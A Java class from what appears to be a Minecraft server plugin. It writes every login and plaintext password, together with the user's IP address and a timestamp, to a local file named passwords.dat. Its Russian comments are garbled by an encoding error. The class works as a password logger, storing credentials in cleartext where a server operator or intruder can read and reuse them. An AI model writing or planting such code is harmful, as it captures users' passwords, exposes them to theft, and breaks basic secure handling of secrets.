package moofPl;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Passwords {
	Main main;
	File log;
	FileWriter filewriter;
	BufferedWriter buffwriter;
	SimpleDateFormat sdf;

	/**
	 * ��������� ������ ������� ����� ������
	 *
	 * @param main
	 *            - ������� �����. ������� ������ ��� ��������� ����� �������.
	 */
	public Passwords(Main main2) {
		main = main2;
		log = new File(main.getDataFolder(), "passwords.dat");
		try {
			if (!log.exists())
				log.createNewFile();
			filewriter = new FileWriter(log, true);
		} catch (Throwable e) {
			e.printStackTrace();
		}
		buffwriter = new BufferedWriter(filewriter);
		sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
	}

	/**
	 * ��������� ����� �����
	 *
	 * @throws Throwable
	 *             - ������ ��� �������� �������. ������� �� ������.
	 */
	public void close() throws Throwable {
		buffwriter.close();
		filewriter.close();
	}

	/**
	 * ����� � ���� ����, �����, ������� ����, IP � �����:������
	 *
	 * @param login
	 *            - ����� ������
	 * @param password
	 *            - ������ ������
	 * @param ip
	 *            - IP ������
	 */
	public void write(String login, String password, String ip) {
		try {
			if (!log.exists())
				log.createNewFile();
			String toWrite = "[" + sdf.format(new Date()) + " " + ip + "] " + login + ":" + password;
			buffwriter.write(toWrite);
			buffwriter.newLine();
			buffwriter.flush();
		} catch (Throwable t) {
			t.printStackTrace();
		}
	}
}
